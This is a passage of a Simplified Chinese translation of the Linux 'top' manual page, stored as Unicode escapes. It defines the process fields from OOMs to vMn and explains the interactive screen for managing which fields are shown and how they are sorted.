+1000\uff0c\u6dfb\u52a0\u5230\u5f53\u524d\u5185\u5b58\u4e0d\u8db3\u5f97\u5206\uff08OOMs\uff09\uff0c\u7136\u540e\u7528\u4e8e\u786e\u5b9a\u5728\u5185\u5b58\u8017\u5c3d\u65f6\u8981\u6740\u6b7b\u54ea\u4e2a\u4efb\u52a1\u3002 16. OOMs -- \u5185\u5b58\u4e0d\u8db3\u5f97\u5206 \u503c\u7684\u8303\u56f4\u4ece 0 \u5230 +1000\uff0c\u7528\u4e8e\u9009\u62e9\u5728\u5185\u5b58\u8017\u5c3d\u65f6\u8981\u6740\u6b7b\u7684\u4efb\u52a1\u3002\u96f6\u8868\u793a\u201c\u4ece\u4e0d\u6740\u201d\uff0c\u800c 1000 \u8868\u793a\u201c\u603b\u662f\u6740\u201d\u3002 17. P -- \u6700\u540e\u4f7f\u7528\u7684 CPU\uff08SMP\uff09 \u4e00\u4e2a\u6570\u5b57\uff0c\u8868\u793a\u6700\u540e\u4f7f\u7528\u7684\u5904\u7406\u5668\u3002\u5728\u771f\u6b63\u7684 SMP \u73af\u5883\u4e2d\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u4f1a\u9891\u7e41\u53d8\u5316\uff0c\u56e0\u4e3a\u5185\u6838\u6545\u610f\u4f7f\u7528\u5f31\u4eb2\u548c\u6027\u3002\u540c\u6837\uff0c\u8fd0\u884c top \u7684\u884c\u4e3a\u53ef\u80fd\u4f1a\u6253\u7834\u8fd9\u79cd\u5f31\u4eb2\u548c\u6027\uff0c\u5e76\u5bfc\u81f4\u66f4\u591a\u7684\u8fdb\u7a0b\u66f4\u9891\u7e41\u5730\u66f4\u6362 CPU\uff08\u7531\u4e8e\u5bf9 CPU \u65f6\u95f4\u7684\u989d\u5916\u9700\u6c42\uff09\u3002 18. PGRP -- \u8fdb\u7a0b\u7ec4 ID \u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u662f\u4e00\u4e2a\u552f\u4e00\u8fdb\u7a0b\u7ec4\u7684\u6210\u5458\uff0c\u8be5\u7ec4\u7528\u4e8e\u5206\u914d\u4fe1\u53f7\u548c\u7ec8\u7aef\u4ee5\u4ef2\u88c1\u5176\u8f93\u5165\u548c\u8f93\u51fa\u8bf7\u6c42\u3002\u521b\u5efa\u8fdb\u7a0b\uff08\u5206\u53c9\uff09\u65f6\uff0c\u5b83\u6210\u4e3a\u5176\u7236\u8fdb\u7a0b\u7ec4\u7684\u6210\u5458\u3002\u6309\u7167\u60ef\u4f8b\uff0c\u6b64\u503c\u7b49\u4e8e\u8fdb\u7a0b\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u7684\u8fdb\u7a0b ID\uff08\u89c1 PID\uff09\uff0c\u79f0\u4e3a\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u3002 19. PID -- \u8fdb\u7a0b ID \u4efb\u52a1\u7684\u552f\u4e00\u8fdb\u7a0b ID\uff0c\u5468\u671f\u6027\u5730\u5faa\u73af\uff0c\u4f46\u4ece\u4e0d\u91cd\u65b0\u542f\u52a8\u4e3a\u96f6\u3002\u5728\u5185\u6838\u672f\u8bed\u4e2d\uff0c\u5b83\u662f\u7531 task_struct \u5b9a\u4e49\u7684\u53ef\u8c03\u5ea6\u5b9e\u4f53\u3002 \u6b64\u503c\u8fd8\u53ef\u4ee5\u7528\u4f5c\uff1a\u8fdb\u7a0b\u7ec4 ID\uff08\u89c1 PGRP\uff09\uff1b\u4f1a\u8bdd ID\uff08\u89c1 SID\uff09\uff1b\u7ebf\u7a0b\u7ec4 ID\uff08\u89c1 TGID\uff09\uff1b\u548c TTY \u8fdb\u7a0b\u7ec4 ID\uff08\u89c1 TPGID\uff09\u3002 20. PPID -- \u7236\u8fdb\u7a0b ID \u4efb\u52a1\u7684\u7236\u8fdb\u7a0b ID\uff08pid\uff09\u3002 21. PR -- \u4f18\u5148\u7ea7 \u4efb\u52a1\u7684\u8c03\u5ea6\u4f18\u5148\u7ea7\u3002\u5982\u679c\u5728\u6b64\u5b57\u6bb5\u4e2d\u770b\u5230 `rt`\uff0c\u5219\u8868\u793a\u4efb\u52a1\u5728\u5b9e\u65f6\u8c03\u5ea6\u4f18\u5148\u7ea7\u4e0b\u8fd0\u884c\u3002 \u5728 Linux \u4e2d\uff0c\u5b9e\u65f6\u4f18\u5148\u7ea7\u6709\u70b9\u8bef\u5bfc\u6027\uff0c\u56e0\u4e3a\u4f20\u7edf\u4e0a\u64cd\u4f5c\u672c\u8eab\u4e0d\u53ef\u62a2\u5360\u3002\u867d\u7136 2.6 \u5185\u6838\u53ef\u4ee5\u53d8\u5f97\u5927\u90e8\u5206\u53ef\u62a2\u5360\uff0c\u4f46\u5e76\u4e0d\u603b\u662f\u8fd9\u6837\u3002 22. RES -- \u9a7b\u7559\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08VIRT\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u4efb\u52a1\u5f53\u524d\u4f7f\u7528\u7684\u672a\u4ea4\u6362\u7269\u7406\u5185\u5b58\u3002\u5b83\u4e5f\u662f RSan\u3001RSfd \u548c RSsh \u5b57\u6bb5\u7684\u603b\u548c\u3002 \u5b83\u53ef\u4ee5\u5305\u542b\u79c1\u6709\u533f\u540d\u9875\u9762\u3001\u6620\u5c04\u5230\u6587\u4ef6\u7684\u79c1\u6709\u9875\u9762\uff08\u5305\u62ec\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\uff09\u4ee5\u53ca\u5171\u4eab\u533f\u540d\u9875\u9762\u3002\u6240\u6709\u8fd9\u4e9b\u5185\u5b58\u90fd\u7531 SWAP \u5355\u72ec\u8868\u793a\u7684\u4ea4\u6362\u6587\u4ef6\u652f\u6301\u3002 \u6700\u540e\uff0c\u6b64\u5b57\u6bb5\u8fd8\u53ef\u80fd\u5305\u542b\u4fee\u6539\u8fc7\u7684\u5171\u4eab\u6587\u4ef6\u652f\u6301\u9875\u9762\uff0c\u8fd9\u4e9b\u9875\u9762\u5145\u5f53\u4e13\u7528\u4ea4\u6362\u6587\u4ef6\uff0c\u56e0\u6b64\u6c38\u8fdc\u4e0d\u4f1a\u5f71\u54cd SWAP\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 23. RSan -- \u9a7b\u7559\u533f\u540d\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u672a\u6620\u5c04\u5230\u6587\u4ef6\u7684\u79c1\u6709\u9875\u9762\u3002 24. RSfd -- \u9a7b\u7559\u6587\u4ef6\u652f\u6301\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u9690\u5f0f\u5171\u4eab\u7684\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u9875\u9762\u3002\u5b83\u8fd8\u5305\u62ec\u663e\u5f0f\u6587\u4ef6\u6620\u5c04\uff0c\u65e0\u8bba\u662f\u79c1\u6709\u8fd8\u662f\u5171\u4eab\u3002 25. RSlk -- \u9a7b\u7559\u9501\u5b9a\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4e0d\u80fd\u88ab\u4ea4\u6362\u51fa\u53bb\u3002 26. RSsh -- \u9a7b\u7559\u5171\u4eab\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u663e\u5f0f\u5171\u4eab\u7684\u533f\u540d shm*/mmap \u9875\u9762\u3002 27. RUID -- \u5b9e\u9645\u7528\u6237 ID \u5b9e\u9645\u7528\u6237 ID\u3002 28. RUSER -- \u5b9e\u9645\u7528\u6237\u540d \u5b9e\u9645\u7528\u6237\u540d\u3002 29. S -- \u8fdb\u7a0b\u72b6\u6001 \u4efb\u52a1\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u4e4b\u4e00\uff1a D = \u4e0d\u53ef\u4e2d\u65ad\u7684\u7761\u7720 I = \u7a7a\u95f2 R = \u8fd0\u884c S = \u7761\u7720 T = \u88ab\u4f5c\u4e1a\u63a7\u5236\u4fe1\u53f7\u505c\u6b62 t = \u5728\u8ddf\u8e2a\u671f\u95f4\u88ab\u8c03\u8bd5\u5668\u505c\u6b62 Z = \u50f5\u5c38 \u663e\u793a\u4e3a\u8fd0\u884c\u7684\u4efb\u52a1\u5e94\u66f4\u6070\u5f53\u5730\u89c6\u4e3a\u51c6\u5907\u8fd0\u884c -- \u5b83\u4eec\u7684 task_struct \u4ec5\u5728 Linux \u8fd0\u884c\u961f\u5217\u4e2d\u8868\u793a\u3002\u5373\u4f7f\u6ca1\u6709\u771f\u6b63\u7684 SMP \u673a\u5668\uff0c \u4f60\u53ef\u80fd\u4f1a\u770b\u5230\u8bb8\u591a\u4efb\u52a1\u5904\u4e8e\u6b64\u72b6\u6001\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e top \u7684\u5ef6\u8fdf\u95f4\u9694\u548c\u4f18\u5148\u503c\u3002 30. SHR -- \u5171\u4eab\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u53ef\u80fd\u88ab\u5176\u4ed6\u8fdb\u7a0b\u4f7f\u7528\u3002\u5b83\u5c06\u5305\u62ec\u5171\u4eab\u533f\u540d\u9875\u9762\u548c\u5171\u4eab\u6587\u4ef6\u652f\u6301\u9875\u9762\u3002\u5b83\u8fd8\u5305\u62ec\u8868\u793a\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u7684\u79c1\u6709\u9875\u9762\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 31. SID -- \u4f1a\u8bdd ID \u4f1a\u8bdd\u662f\u8fdb\u7a0b\u7ec4\uff08\u89c1 PGRP\uff09\u7684\u96c6\u5408\uff0c\u901a\u5e38\u7531\u767b\u5f55 shell \u5efa\u7acb\u3002\u65b0\u5206\u53c9\u7684\u8fdb\u7a0b\u52a0\u5165\u521b\u5efa\u8005\u7684\u4f1a\u8bdd\u3002\u6309\u7167\u60ef\u4f8b\uff0c \u6b64\u503c\u7b49\u4e8e\u4f1a\u8bdd\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u7684\u8fdb\u7a0b ID\uff08\u89c1 PID\uff09\uff0c\u79f0\u4e3a\u4f1a\u8bdd\u9886\u5bfc\uff0c\u901a\u5e38\u662f\u767b\u5f55 shell\u3002 32. SUID -- \u4fdd\u5b58\u7684\u7528\u6237 ID \u4fdd\u5b58\u7684\u7528\u6237 ID\u3002 33. SUPGIDS -- \u8865\u5145\u7ec4 ID \u5728\u767b\u5f55\u65f6\u6216\u4ece\u4efb\u52a1\u7684\u7236\u8fdb\u7a0b\u7ee7\u627f\u7684\u4efb\u4f55\u8865\u5145\u7ec4 ID\u3002\u5b83\u4eec\u4ee5\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u663e\u793a\u3002 \u6ce8\u610f\uff1aSUPGIDS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 34. SUPGRPS -- SUPGRPS -- \u8865\u5145\u7ec4\u540d \u5728\u767b\u5f55\u65f6\u6216\u4ece\u4efb\u52a1\u7684\u7236\u8fdb\u7a0b\u7ee7\u627f\u7684\u4efb\u4f55\u8865\u5145\u7ec4\u540d\u3002\u5b83\u4eec\u4ee5\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u663e\u793a\u3002 \u6ce8\u610f\uff1aSUPGRPS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 35. SUSER -- \u4fdd\u5b58\u7684\u7528\u6237\u540d \u4fdd\u5b58\u7684\u7528\u6237\u540d\u3002 36. SWAP -- \u4ea4\u6362\u5927\u5c0f\uff08KiB\uff09 \u5f53\u7269\u7406\u5185\u5b58\u8fc7\u5ea6\u627f\u8bfa\u65f6\u5199\u5165\u4ea4\u6362\u6587\u4ef6\u7684\u4efb\u52a1\u5730\u5740\u7a7a\u95f4\u4e2d\u4ee5\u524d\u9a7b\u7559\u7684\u90e8\u5206\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 37. TGID -- \u7ebf\u7a0b\u7ec4 ID \u4efb\u52a1\u6240\u5c5e\u7684\u7ebf\u7a0b\u7ec4\u7684 ID\u3002\u5b83\u662f\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u7684 PID\u3002\u5728\u5185\u6838\u672f\u8bed\u4e2d\uff0c\u5b83\u8868\u793a\u90a3\u4e9b\u5171\u4eab mm_struct \u7684\u4efb\u52a1\u3002 38. TIME -- CPU \u65f6\u95f4 \u4efb\u52a1\u81ea\u542f\u52a8\u4ee5\u6765\u4f7f\u7528\u7684\u603b CPU \u65f6\u95f4\u3002\u5f53\u7d2f\u79ef\u6a21\u5f0f\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5c06\u5217\u51fa\u5176\u81ea\u8eab\u53ca\u5176\u5df2\u7ec8\u6b62\u7684\u5b50\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `S` \u5207\u6362\u7d2f\u79ef\u6a21\u5f0f\uff0c`S` \u65e2\u662f\u547d\u4ee4\u884c\u9009\u9879\u4e5f\u662f\u4ea4\u4e92\u547d\u4ee4\u3002\u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `S` \u4ea4\u4e92\u547d\u4ee4\u3002 39. TIME+ -- CPU \u65f6\u95f4\uff0c\u4ee5\u767e\u5206\u4e4b\u4e00\u79d2\u4e3a\u5355\u4f4d \u4e0e TIME \u76f8\u540c\uff0c\u4f46\u53cd\u6620\u66f4\u591a\u7c92\u5ea6\uff0c\u901a\u8fc7\u767e\u5206\u4e4b\u4e00\u79d2\u3002 40. TPGID -- TTY \u8fdb\u7a0b\u7ec4 ID \u8fde\u63a5\u7684 TTY \u7684\u524d\u53f0\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u7ec4 ID\uff0c\u5982\u679c\u8fdb\u7a0b\u672a\u8fde\u63a5\u5230\u7ec8\u7aef\uff0c\u5219\u4e3a -1\u3002\u6309\u7167\u60ef\u4f8b\uff0c\u6b64\u503c\u7b49\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u7684\u8fdb\u7a0b ID\uff08\u89c1 PGRP\uff09\u3002 41. TTY -- \u63a7\u5236\u7ec8\u7aef \u63a7\u5236\u7ec8\u7aef\u7684\u540d\u79f0\u3002\u8fd9\u901a\u5e38\u662f\u4efb\u52a1\u542f\u52a8\u65f6\u4f7f\u7528\u7684\u8bbe\u5907\uff08\u4e32\u884c\u7aef\u53e3\u3001\u865a\u62df\u7ec8\u7aef\u7b49\uff09\uff0c\u5e76\u7528\u4e8e\u8f93\u5165\u6216\u8f93\u51fa\u3002\u7136\u800c\uff0c\u4efb\u52a1\u4e0d\u5fc5\u4e0e\u7ec8\u7aef\u5173\u8054\uff0c \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u4f1a\u770b\u5230\u663e\u793a `?`\u3002 42. UID -- \u7528\u6237 ID \u4efb\u52a1\u6240\u6709\u8005\u7684\u6709\u6548\u7528\u6237 ID\u3002 43. USED -- \u4f7f\u7528\u4e2d\u7684\u5185\u5b58\uff08KiB\uff09 \u6b64\u5b57\u6bb5\u8868\u793a\u4efb\u52a1\u4f7f\u7528\u7684\u672a\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08RES\uff09\u52a0\u4e0a\u5176\u5730\u5740\u7a7a\u95f4\u4e2d\u4ea4\u6362\u51fa\u7684\u90e8\u5206\uff08SWAP\uff09\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 44. USER -- \u7528\u6237\u540d \u4efb\u52a1\u6240\u6709\u8005\u7684\u6709\u6548\u7528\u6237\u540d\u3002 45. VIRT -- \u865a\u62df\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u4efb\u52a1\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58\u603b\u91cf\u3002\u5b83\u5305\u62ec\u6240\u6709\u4ee3\u7801\u3001\u6570\u636e\u548c\u5171\u4eab\u5e93\uff0c\u52a0\u4e0a\u5df2\u4ea4\u6362\u51fa\u7684\u9875\u9762\u548c\u5df2\u6620\u5c04\u4f46\u672a\u4f7f\u7528\u7684\u9875\u9762\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 46. WCHAN -- \u4f11\u7720\u4e2d\u7684\u51fd\u6570 \u6b64\u5b57\u6bb5\u5c06\u663e\u793a\u4efb\u52a1\u5f53\u524d\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u7684\u540d\u79f0\u3002\u8fd0\u884c\u4e2d\u7684\u4efb\u52a1\u5c06\u5728\u6b64\u5217\u4e2d\u663e\u793a\u7834\u6298\u53f7 (`-`)\u3002 47. nDRT -- \u810f\u9875\u6570 \u81ea\u4e0a\u6b21\u5199\u5165\u8f85\u52a9\u5b58\u50a8\u4ee5\u6765\u5df2\u4fee\u6539\u7684\u9875\u9762\u6570\u3002\u810f\u9875\u5fc5\u987b\u5199\u5165\u8f85\u52a9\u5b58\u50a8\uff0c\u7136\u540e\u76f8\u5e94\u7684\u7269\u7406\u5185\u5b58\u4f4d\u7f6e\u624d\u80fd\u7528\u4e8e\u5176\u4ed6\u865a\u62df\u9875\u9762\u3002 \u6b64\u5b57\u6bb5\u5728 linux 2.6 \u7248\u672c\u4e2d\u88ab\u5f03\u7528\uff0c\u603b\u662f\u4e3a\u96f6\u3002 48. nMaj -- \u4e3b\u9875\u9762\u9519\u8bef\u6570 \u4efb\u52a1\u53d1\u751f\u7684\u4e3b\u9875\u9762\u9519\u8bef\u6570\u3002\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u4ece\u5176\u5730\u5740\u7a7a\u95f4\u5f53\u524d\u4e0d\u5b58\u5728\u7684\u865a\u62df\u9875\u9762\u8bfb\u53d6\u6216\u5199\u5165\u65f6\uff0c\u4f1a\u53d1\u751f\u9875\u9762\u9519\u8bef\u3002 \u4e3b\u9875\u9762\u9519\u8bef\u662f\u6307\u6d89\u53ca\u8f85\u52a9\u5b58\u50a8\u8bbf\u95ee\u4ee5\u4f7f\u8be5\u9875\u9762\u53ef\u7528\u7684\u9519\u8bef\u3002 49. nMin -- \u6b21\u9875\u9762\u9519\u8bef\u6570 \u4efb\u52a1\u53d1\u751f\u7684\u6b21\u9875\u9762\u9519\u8bef\u6570\u3002\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u4ece\u5176\u5730\u5740\u7a7a\u95f4\u5f53\u524d\u4e0d\u5b58\u5728\u7684\u865a\u62df\u9875\u9762\u8bfb\u53d6\u6216\u5199\u5165\u65f6\uff0c\u4f1a\u53d1\u751f\u9875\u9762\u9519\u8bef\u3002 \u6b21\u9875\u9762\u9519\u8bef\u4e0d\u6d89\u53ca\u8f85\u52a9\u5b58\u50a8\u8bbf\u95ee\u4ee5\u4f7f\u8be5\u9875\u9762\u53ef\u7528\u3002 50. nTH -- \u7ebf\u7a0b\u6570 \u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u7ebf\u7a0b\u6570\u3002 51. nsIPC -- IPC \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u8d44\u6e90\uff08\u5982 System V IPC \u5bf9\u8c61\u548c POSIX \u6d88\u606f\u961f\u5217\uff09\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002 52. nsMNT -- \u6302\u8f7d\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u6587\u4ef6\u7cfb\u7edf\u6302\u8f7d\u70b9\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\uff0c\u4ece\u800c\u63d0\u4f9b\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u7ed3\u6784\u7684\u4e0d\u540c\u89c6\u56fe\u3002 53. nsNET -- \u7f51\u7edc\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8d44\u6e90\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u3001IP \u5730\u5740\u3001IP \u8def\u7531\u3001\u7aef\u53e3\u53f7\u7b49\uff09\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002 54. nsPID -- PID \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8fdb\u7a0b ID \u53f7\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u4e0d\u5fc5\u4fdd\u6301\u552f\u4e00\u3002\u56e0\u6b64\uff0c\u6bcf\u4e2a\u8fd9\u6837\u7684\u547d\u540d\u7a7a\u95f4\u53ef\u4ee5\u6709\u81ea\u5df1\u7684 `init/systemd` \uff08PID #1\uff09\u6765\u7ba1\u7406\u5404\u79cd\u521d\u59cb\u5316\u4efb\u52a1\u548c\u6536\u517b\u5b64\u513f\u5b50\u8fdb\u7a0b\u3002 55. nsUSER -- \u7528\u6237\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u7528\u6237\u548c\u7ec4 ID \u53f7\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002\u56e0\u6b64\uff0c\u8fdb\u7a0b\u5728\u7528\u6237\u547d\u540d\u7a7a\u95f4\u4e4b\u5916\u53ef\u4ee5\u6709\u6b63\u5e38\u7684\u975e\u7279\u6743\u7528\u6237 ID\uff0c \u800c\u5728\u8be5\u547d\u540d\u7a7a\u95f4\u5185\u5177\u6709 0 \u7684\u7528\u6237 ID\uff0c\u5177\u6709\u5b8c\u5168\u7684 root \u6743\u9650\u3002 56. nsUTS -- UTS \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u4e3b\u673a\u540d\u548c NIS \u57df\u540d\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002UTS \u7b80\u5355\u5730\u8868\u793a\u201cUNIX \u5171\u4eab\u7cfb\u7edf\u201d\u3002 57. vMj -- \u4e3b\u9875\u9762\u9519\u8bef\u6570\u589e\u91cf \u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u53d1\u751f\u7684\u4e3b\u9875\u9762\u9519\u8bef\u6570\uff08\u89c1 nMaj\uff09\u3002 58. vMn -- \u6b21\u9875\u9762\u9519\u8bef\u6570\u589e\u91cf \u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u53d1\u751f\u7684\u6b21\u9875\u9762\u9519\u8bef\u6570\uff08\u89c1 nMin\uff09\u3002 3b. \u7ba1\u7406\u5b57\u6bb5 \u6309\u4e0b\u4ea4\u4e92\u547d\u4ee4 `f` \u6216 `F` \u540e\uff0c\u4f60\u5c06\u770b\u5230\u4e00\u4e2a\u5c4f\u5e55\uff0c\u663e\u793a\uff1a1\uff09\u201c\u5f53\u524d\u201d\u7a97\u53e3\u540d\u79f0\uff1b2\uff09\u6307\u5b9a\u7684\u6392\u5e8f\u5b57\u6bb5\uff1b3\uff09\u5f53\u524d\u987a\u5e8f\u663e\u793a\u7684\u6240\u6709\u5b57\u6bb5\u4ee5\u53ca\u63cf\u8ff0\u3002 \u6807\u6709\u661f\u53f7\u7684\u6761\u76ee\u662f\u5f53\u524d\u663e\u793a\u7684\u5b57\u6bb5\uff0c\u5c4f\u5e55\u5bbd\u5ea6\u5141\u8bb8\u3002 \u2022 \u5982\u5c4f\u5e55\u4e0a\u7684\u8bf4\u660e\u6240\u793a\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e0b\u7bad\u5934\u952e\u5728\u5b57\u6bb5\u4e4b\u95f4\u5bfc\u822a\u3002PgUp\u3001PgDn\u3001Home \u548c End \u952e\u4e5f\u53ef\u4ee5\u5feb\u901f\u5230\u8fbe\u7b2c\u4e00\u4e2a\u6216\u6700\u540e\u4e00\u4e2a\u53ef\u7528\u5b57\u6bb5\u3002 \u2022 \u53f3\u7bad\u5934\u952e\u9009\u62e9\u4e00\u4e2a\u5b57\u6bb5\u8fdb\u884c\u91cd\u65b0\u5b9a\u4f4d\uff0c\u5de6\u7bad\u5934\u952e\u6216 <Enter> \u952e\u786e\u8ba4\u8be5\u5b57\u6bb5\u7684\u4f4d\u7f6e\u3002 \u2022 `d` \u952e\u6216 <Space> \u952e\u5207\u6362\u5b57\u6bb5\u7684\u663e\u793a\u72b6\u6001\uff0c\u56e0\u6b64\u662f\u5426\u663e\u793a\u661f\u53f7\u3002 \u2022 `s` \u952e\u6307\u5b9a\u4e00\u4e2a\u5b57\u6bb5\u4e3a\u6392\u5e8f\u5b57\u6bb5\u3002\u6709\u5173\u9009\u62e9\u6392\u5e8f\u5b57\u6bb5\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u6392\u5e8f\u3002 \u2022 `a` \u548c `w` \u952e\u53ef\u4ee5\u7528\u4e8e\u5faa\u73af\u6240\u6709\u53ef\u7528\u7a97\u53e3\uff0c`q` \u6216 <Esc> \u952e\u9000\u51fa\u5b57\u6bb5\u7ba1\u7406\u3002 \u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5728\u5168\u5c4f\u6a21\u5f0f\u6216\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u66f4\u6539\u201c\u5f53\u524d\u201d\u7a97\u53e3/\u5b57\u6bb5\u7ec4\u3002\u8fd4\u56de top \u663e\u793a\u65f6\uff0c\u6309 `q` \u6216 <Esc> \u952e\u65f6\u76ee\u6807\u7a97\u53e3\u5c06\u88ab\u8bbe\u4e3a\u5f53\u524d\u7a97\u53e3\u3002 \u6709\u5173\u201c\u5f53\u524d\u201d\u7a97\u53e3\u548c\u5b57\u6bb5\u7ec4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879\u548c `g` \u4ea4\u4e92\u547d\u4ee4\u3002 